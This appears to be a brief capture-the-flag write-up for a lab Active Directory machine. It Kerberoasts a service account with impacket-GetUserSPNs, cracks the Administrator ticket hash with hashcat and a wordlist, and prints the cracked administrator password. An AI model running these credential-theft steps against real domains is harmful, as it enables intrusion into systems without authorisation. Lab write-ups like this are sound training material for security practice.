Didn't really get foothold but could enumerate the /users share which can be used to read `user.txt` content under `C:\Users\SVC_TGS\Desktop\`

Attempted Kerberoasting
```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS
```
This dumped krb5tgs hash for `Administrator`

```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS
```

Cracked the hash using hashcat
```bash
hashcat admin.krb5tgs /usr/share/wordlists/rockyou.txt
```
`Administrator:Ticketmaster1968`

